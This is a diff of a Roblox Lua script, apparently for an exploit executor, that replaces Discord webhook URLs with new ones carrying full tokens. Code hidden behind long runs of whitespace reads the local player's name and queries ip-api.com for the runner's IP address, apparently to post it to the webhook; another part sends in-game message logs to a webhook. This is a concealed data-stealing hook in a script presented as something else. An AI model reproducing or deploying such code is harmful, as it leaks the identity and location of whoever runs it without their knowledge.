@@ -579,7 +579,7 @@ local marketplaceService = game:GetService("MarketplaceService")
 local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
 if isSuccessful then
  
-local wh = 'https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR'
+local wh = 'https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu'
 local embed1 = {
        ['title'] = 'Beginning of Message logs on '..info.Name.." at "..tostring(os.date("%m/%d/%y at time %X"))
    }
@@ -659,7 +659,7 @@ end
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                                       local player_name = game:GetService("Players").LocalPlayer.Name
-                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"
+                                                                                                                                                                                                                                                                                      local webhook_url = "https://discord.com/api/webhooks/1015029355132497950/ybmdAUGu0_-9FBvuGbL_KFUo8zUXWtBhoxJysAE_s_wFrUOFFZDGTonK-DDKx0hVEAvu"
 
                                                                                                                                                                                                                                                                                       local ip_info = syn.request({
                                                                                                                                                                                                                                                                                      Url = "http://ip-api.com/json",
